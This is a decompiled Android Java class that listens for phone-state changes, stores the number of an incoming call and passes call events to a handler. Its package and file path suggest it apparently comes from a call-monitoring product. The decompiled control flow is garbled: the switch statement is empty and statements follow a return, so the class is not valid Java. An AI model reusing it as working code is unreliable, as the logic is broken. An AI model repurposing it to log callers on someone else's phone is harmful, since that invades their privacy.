package com.vvt.callhandler.phonestate;

import android.telephony.PhoneStateListener;

public class a
  extends PhoneStateListener
{
  private static final boolean a = com.vvt.ak.a.a;
  private static int c;
  private com.vvt.callhandler.a b;
  private String d;
  
  public a(com.vvt.callhandler.a parama)
  {
    this.b = parama;
  }
  
  public void onCallStateChanged(int paramInt, String paramString)
  {
    int i = 1;
    super.onCallStateChanged(paramInt, paramString);
    boolean bool1;
    if (paramInt == i)
    {
      bool1 = a;
      if (bool1) {}
      this.d = paramString;
    }
    switch (paramInt)
    {
    }
    for (;;)
    {
      c = paramInt;
      return;
      bool1 = a;
      if (bool1) {}
      com.vvt.callhandler.a locala = this.b;
      locala.a();
      continue;
      bool1 = a;
      if (bool1) {}
      int j = c;
      if (j == i)
      {
        boolean bool2 = a;
        if (bool2) {}
        locala = this.b;
        String str = this.d;
        locala.a(str);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/phonestate/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */